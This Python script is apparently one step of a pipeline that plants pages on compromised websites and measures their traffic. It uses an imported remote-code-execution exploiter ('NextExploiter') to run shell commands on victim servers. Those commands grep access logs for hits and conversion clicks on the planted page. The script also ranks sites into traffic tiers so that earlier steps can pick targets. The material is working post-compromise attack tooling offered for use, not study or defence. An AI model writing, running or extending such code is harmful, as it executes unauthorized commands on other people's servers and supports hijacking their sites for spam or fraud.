#!/usr/bin/env python3
"""
Step 8: Traffic tracking — server logs, GA detection, GSC/rankings, conversions.

  manifest + report + optional tracking_manual.csv → results/traffic_report.csv

Remote (RCE):
  - access log hits for published page slug
  - conversion path clicks in logs

Public HTTP:
  - GA / GTM snippet on live page

Manual (config/tracking_manual.csv):
  - gsc_clicks, ranking_keyword, ranking_position

Usage:
  python3 scripts/track_traffic.py --test -u https://example.com
  python3 scripts/track_traffic.py --indexed-only
  python3 scripts/track_traffic.py --published-only
"""
import argparse
import csv
import os
import re
import shlex
import sys
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.error import HTTPError, URLError
from urllib.parse import urlparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'tools'))
from trial_common import (
    INDEXED_TXT,
    INDEXING_CSV,
    LOGS_DIR,
    MANIFEST_CSV,
    PROJECT_ROOT,
    REPORT_CSV,
    TRACKING_MANUAL,
    TRACKING_TXT,
    TRAFFIC_REPORT_CSV,
    TRAFFIC_OVERRIDES,
    http_fetch,
    load_manifest,
    load_published,
    load_report,
)

from nextrce import NextExploiter

TRACK_LOG = os.path.join(LOGS_DIR, 'traffic.log')
RCE_TIMEOUT = 45

TRAFFIC_COLUMNS = [
    'url', 'page_url', 'slug', 'server_log_hits', 'conversion_clicks',
    'ga_detected', 'gsc_clicks', 'ranking_keyword', 'ranking_position',
    'traffic_tier', 'notes',
]

GA_PATTERNS = (
    'googletagmanager.com',
    'google-analytics.com',
    'gtag(',
    'G-',
    'UA-',
)


def load_tracking_manual(path=TRACKING_MANUAL):
    data = {}
    if not os.path.isfile(path):
        return data
    with open(path, newline='', encoding='utf-8') as f:
        for row in csv.DictReader(f):
            url = (row.get('url') or '').strip()
            if not url or url.startswith('#'):
                continue
            data[url] = {
                'gsc_clicks': (row.get('gsc_clicks') or '').strip(),
                'ranking_keyword': (row.get('ranking_keyword') or '').strip(),
                'ranking_position': (row.get('ranking_position') or '').strip(),
                'conversion_path': (row.get('conversion_path') or '').strip(),
            }
    return data


def load_indexed_urls(path=INDEXED_TXT):
    if not os.path.isfile(path):
        return set()
    urls = set()
    with open(path, encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                urls.add(line)
    return urls


def load_indexing_map(path=INDEXING_CSV):
    data = {}
    if not os.path.isfile(path):
        return data
    with open(path, newline='', encoding='utf-8') as f:
        for row in csv.DictReader(f):
            data[row['url']] = row
    return data


def detect_ga(page_url, timeout=15):
    try:
        _, body, _ = http_fetch(page_url, timeout)
    except (HTTPError, URLError, OSError):
        return 'no', 'page_unreachable'
    lower = body.lower()
    if any(p.lower() in lower for p in GA_PATTERNS):
        return 'yes', 'ga_found'
    return 'no', 'no_ga_tag'


def rce_count_log(exploiter, target_url, needle, timeout=RCE_TIMEOUT):
    needle_q = shlex.quote(needle)
    cmd = (
        f"hits=0; "
        f"for f in /var/log/nginx/access.log /var/log/nginx/access.log.1 "
        f"/var/log/apache2/access.log /var/log/httpd/access_log "
        f"/proc/1/fd/1 /tmp/access.log; do "
        f"[ -r \"$f\" ] 2>/dev/null && "
        f"c=$(grep -c {needle_q} \"$f\" 2>/dev/null || true) && "
        f"hits=$((hits+c)); "
        f"done; echo LOG:$hits"
    )
    out = exploiter.exec_cmd(target_url, cmd, timeout=timeout)
    if out is None:
        return 0, 'rce_failed'
    m = re.search(r'LOG:(\d+)', out)
    if m:
        return int(m.group(1)), 'ok'
    return 0, 'parse_failed'


def compute_tier(log_hits, conversion_clicks, gsc_clicks, manual_tier=''):
    if manual_tier in ('high', 'medium', 'low'):
        return manual_tier
    try:
        gsc = int(gsc_clicks) if gsc_clicks else 0
    except ValueError:
        gsc = 0
    score = log_hits + conversion_clicks * 5 + gsc
    if score >= 100:
        return 'high'
    if score >= 10:
        return 'medium'
    return 'low'


def track_one(manifest_row, report_row, manual, indexing_row, use_rce=True, timeout=15):
    url = manifest_row['url']
    slug = manifest_row['slug']
    page_url = manifest_row.get('canonical_url') or f"{url.rstrip('/')}/{slug}"
    notes = []

    ga_detected, ga_note = detect_ga(page_url, timeout)
    if ga_note != 'ga_found':
        notes.append(ga_note)

    log_hits = 0
    conversion_clicks = 0
    if use_rce and report_row.get('access') == 'yes':
        exploiter = NextExploiter(timeout=RCE_TIMEOUT)
        log_hits, log_note = rce_count_log(exploiter, url, f'/{slug}', timeout=RCE_TIMEOUT)
        if log_note != 'ok':
            notes.append(f'logs:{log_note}')
        conv_url = manifest_row.get('conversion_url', '')
        if conv_url:
            dest_host = urlparse(conv_url).hostname or 'liumen26'
            c1, n1 = rce_count_log(exploiter, url, dest_host, timeout=RCE_TIMEOUT)
            c2, n2 = rce_count_log(exploiter, url, 'utm_medium=trafficpage', timeout=RCE_TIMEOUT)
            conversion_clicks = c1 + c2
            if n1 != 'ok' and n2 != 'ok':
                notes.append('conv:rce_failed')
        else:
            conv_path = manual.get('conversion_path') or f'/{slug}'
            conversion_clicks, conv_note = rce_count_log(
                exploiter, url, conv_path, timeout=RCE_TIMEOUT)
            if conv_note != 'ok':
                notes.append(f'conv:{conv_note}')
    else:
        notes.append('no_rce')

    conv_url = manifest_row.get('conversion_url', '')
    if conv_url and ga_note != 'page_unreachable':
        try:
            _, body, _ = http_fetch(page_url, timeout)
            dest_host = urlparse(conv_url).hostname or ''
            if dest_host and dest_host in body:
                notes.append('cta_present')
        except (HTTPError, URLError, OSError):
            pass

    gsc_clicks = manual.get('gsc_clicks', '')
    ranking_keyword = manual.get('ranking_keyword', '')
    ranking_position = manual.get('ranking_position', '')

    tier = compute_tier(log_hits, conversion_clicks, gsc_clicks)

    if indexing_row:
        idx_status = indexing_row.get('index_status', '')
        if idx_status and idx_status != 'ready':
            notes.append(f'index:{idx_status}')

    return {
        'url': url,
        'page_url': page_url,
        'slug': slug,
        'server_log_hits': str(log_hits),
        'conversion_clicks': str(conversion_clicks),
        'ga_detected': ga_detected,
        'gsc_clicks': gsc_clicks,
        'ranking_keyword': ranking_keyword,
        'ranking_position': ranking_position,
        'traffic_tier': tier,
        'notes': ' | '.join(n for n in notes if n),
    }


def write_traffic_report(rows, path=TRAFFIC_REPORT_CSV):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'w', newline='', encoding='utf-8') as f:
        w = csv.DictWriter(f, fieldnames=TRAFFIC_COLUMNS, quoting=csv.QUOTE_ALL)
        w.writeheader()
        w.writerows(rows)


def sync_traffic_csv(rows, path=TRAFFIC_OVERRIDES):
    """Update config/traffic.csv tiers for Step 4 candidate selection."""
    os.makedirs(os.path.dirname(path), exist_ok=True)
    lines = ['url,traffic_value', '# Auto-updated by Step 8 track_traffic.py']
    for row in rows:
        if row['traffic_tier'] in ('high', 'medium'):
            lines.append(f"{row['url']},{row['traffic_tier']}")
    with open(path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(lines) + '\n')


def write_tracking_txt(rows, path=TRACKING_TXT):
    urls = [r['url'] for r in rows if r['traffic_tier'] in ('high', 'medium')]
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'w', encoding='utf-8') as f:
        for url in urls:
            f.write(url + '\n')
    return urls


def write_log(rows):
    os.makedirs(os.path.dirname(TRACK_LOG), exist_ok=True)
    with open(TRACK_LOG, 'w', encoding='utf-8') as f:
        f.write(f'# tracked {datetime.now().isoformat()}\n')
        for row in rows:
            f.write(
                f"{row['traffic_tier']}\t{row['url']}\t"
                f"hits={row['server_log_hits']} conv={row['conversion_clicks']} "
                f"ga={row['ga_detected']} gsc={row['gsc_clicks'] or '-'}\n"
            )


def filter_rows(manifest, published_only, indexed_only, url_filter, test):
    rows = manifest
    if published_only:
        pub = set(load_published())
        if pub:
            rows = [r for r in rows if r['url'] in pub]
    if indexed_only:
        idx = load_indexed_urls()
        if idx:
            rows = [r for r in rows if r['url'] in idx]
    if url_filter:
        rows = [r for r in rows if r['url'] == url_filter]
    if test:
        rows = rows[:1]
    return rows


def main():
    parser = argparse.ArgumentParser(description='Step 8: traffic tracking')
    parser.add_argument('-u', '--url', help='Track one URL from manifest')
    parser.add_argument('--test', action='store_true', help='First row only')
    parser.add_argument('--published-only', action='store_true')
    parser.add_argument('--indexed-only', action='store_true')
    parser.add_argument('--no-rce', action='store_true', help='HTTP-only (no log scraping)')
    parser.add_argument('-t', '--threads', type=int, default=3)
    parser.add_argument('--timeout', type=int, default=15)
    args = parser.parse_args()

    os.chdir(PROJECT_ROOT)
    if not os.path.isfile(MANIFEST_CSV):
        print(f'[!] Manifest missing: {MANIFEST_CSV}', file=sys.stderr)
        return 1

    manifest = filter_rows(
        load_manifest(),
        args.published_only,
        args.indexed_only,
        args.url,
        args.test,
    )
    if not manifest:
        print('[!] No rows to track', file=sys.stderr)
        return 1

    _, report_rows = load_report(REPORT_CSV, require_data=True)
    manual_all = load_tracking_manual()
    indexing_map = load_indexing_map()

    print(f'[*] Step 8: tracking {len(manifest)} site(s) …')

    def _job(mrow):
        url = mrow['url']
        manual = manual_all.get(url, {})
        idx = indexing_map.get(url, {})
        rep = report_rows.get(url, {})
        return track_one(
            mrow, rep, manual, idx,
            use_rce=not args.no_rce,
            timeout=args.timeout,
        )

    workers = min(args.threads, len(manifest))
    if workers <= 1:
        results = [_job(r) for r in manifest]
    else:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            results = list(ex.map(_job, manifest))

    write_traffic_report(results)
    sync_traffic_csv(results)
    tracked = write_tracking_txt(results)
    write_log(results)

    tiers = {}
    for r in results:
        tiers[r['traffic_tier']] = tiers.get(r['traffic_tier'], 0) + 1

    print(f'[*] tiers: high={tiers.get("high", 0)} medium={tiers.get("medium", 0)} '
          f'low={tiers.get("low", 0)}')
    print(f'    report:   {TRAFFIC_REPORT_CSV}')
    print(f'    tracking: {TRACKING_TXT} ({len(tracked)} URLs)')
    print(f'    traffic:  {TRAFFIC_OVERRIDES} (updated for Step 4)')
    print(f'    log:      {TRACK_LOG}')
    print('[*] Add GSC/rank data in config/tracking_manual.csv and re-run to refine tiers.')
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
